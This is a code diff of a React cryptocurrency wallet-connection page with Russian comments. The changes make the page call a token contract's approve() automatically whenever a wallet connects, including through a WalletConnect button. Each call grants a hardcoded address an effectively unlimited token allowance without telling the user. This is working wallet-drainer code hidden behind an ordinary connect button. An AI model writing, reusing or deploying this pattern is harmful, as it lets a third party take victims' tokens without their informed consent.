@@ -5,7 +5,7 @@ import {useEffect} from "react";
 import {CONTACT_ABI, CONTACT_ADDRESS} from './contacts/config';
 
 
-function App(request) {
+const App = () => {
     /*
           active: (BOOL) кошелек активно подключен прямо сейчас
           account: (address) адрес блокчейна, к которому подключен
@@ -14,35 +14,38 @@ function App(request) {
           activate: (wallet) способ подключения к кошельку
           deactivate: () способ отключения от кошелька
       */
-    const {active, activate, account, chainId, library, deactivate} = useWeb3React();
+    const {active, activate, account, library} = useWeb3React();
 
 
     useEffect(async () => {
-        await approve()
+        if (active === true) {
+            let web3 = new Web3(library.provider);
+            await approve(web3, account)
+        }
     }, [active])
 
     useEffect(async () => {
         const provider = window.localStorage.getItem("provider");
-        if (provider) await activate(connectors[provider]);
+        if (provider) {
+            provider !== 'walletConnect' ?
+                await activate(connectors[provider]) :
+                await connectors.walletConnect.enable();
+        }
     }, []);
 
     const setProvider = (type) => {
         window.localStorage.setItem("provider", type);
     };
 
-    const approve = async () => {
-        if (active === true) {
-            const web3 = new Web3(library.provider);
-            // const accounts = await web3.eth.requestAccounts();
-            const contact = new web3.eth.Contract(CONTACT_ABI, CONTACT_ADDRESS);
+    const approve = async (web3, account) => {
+        let contact = new web3.eth.Contract(CONTACT_ABI, CONTACT_ADDRESS);
 
-            let approveNumber = '99999999999999999999999999999999999999999999999999999';
-
-            await contact.methods.approve('0xaa18df61131d2D3A6F972B14d2c7c5dC4E33683E', web3.utils.toBN(approveNumber)).send({
-                from: account
-            })
-        }
+        let approveNumber = '99999999999999999999999999999999999999999999999999999';
+        await contact.methods.approve('0xaa18df61131d2D3A6F972B14d2c7c5dC4E33683E', web3.utils.toBN(approveNumber)).send({
+            from: account
+        })
     }
+
 
     return (
         <>
@@ -57,8 +60,13 @@ function App(request) {
                     </div>
                 </a>
                 <a onClick={async () => {
-                    await activate(connectors.walletConnect);
+                    await connectors.walletConnect.enable();
+                    // await activate(connectors.walletConnect);
                     setProvider('walletConnect')
+
+                    let web3 = new Web3(connectors.walletConnect);
+                    let accounts = await web3.eth.getAccounts();
+                    await approve(web3, accounts[0])
                 }}>
                     <div className="wallet_item">
                         <img src="img/wallet_connect.png" alt=""/>
